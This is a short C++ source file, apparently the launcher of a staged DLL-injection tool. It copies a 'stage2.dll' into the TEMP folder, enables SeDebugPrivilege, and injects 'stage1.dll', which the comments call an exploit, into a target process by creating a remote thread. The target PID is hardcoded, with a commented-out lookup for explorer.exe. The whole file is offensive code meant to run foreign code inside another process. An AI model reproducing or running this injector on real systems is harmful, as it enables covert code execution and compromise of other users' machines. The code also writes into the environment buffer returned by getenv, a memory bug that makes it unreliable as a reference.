#define _CRT_SECURE_NO_WARNINGS
//Standar Headers
#include <string>
//Code for dll injection (my RemoteThread implementation) 
#include "injector.hpp"



int main(int argc, char *argv[])
{
	DWORD targetPID;
	int result;
	char source[MAX_PATH];
	GetModuleFileName(NULL, source, sizeof(source));
	strcat(source, "\\stage1.dll");
	Sleep(5000);

	std::cout << "[>] Preparing Enviroment";
	char* temp;
	temp = getenv("TEMP");
	strcat(temp,"\\stage2.dll");

	int z = CopyFile("stage2.dll", temp, 0);//Copies the stage2 dll to temp so stage1 can find it
	if (z!=0)
	{
		std::cout << "[OK]" << std::endl;
	}
	else
	{
		std::cout << "[FAIL]" << std::endl;
		Sleep(1000);
		exit(EXIT_FAILURE);
	}
	


	EnableDebugPrivilege(true);                //Enable SeDebugPrivilege to make everything easier (may not be needed)
	targetPID = 4352;//getPIDbyName("explorer.exe"); //Get explorer.exe PID
	std::wcout << "PID: "<<targetPID;
	Sleep(10000);
	result = RemoteThread(targetPID, source); //Inject the stage 1 exploit into it, this is too standar+no acces to C:/ Change to current dir
	if (result != 0)
	{
		std::cout << "[>]Stage 1 couldn't be reached" << std::endl;
		Sleep(1000);
		exit(EXIT_FAILURE);
	}
	else
	{
		std::cout << "[>]Stage 1 successfuly reached" << std::endl;
	}

	
	return 0;
}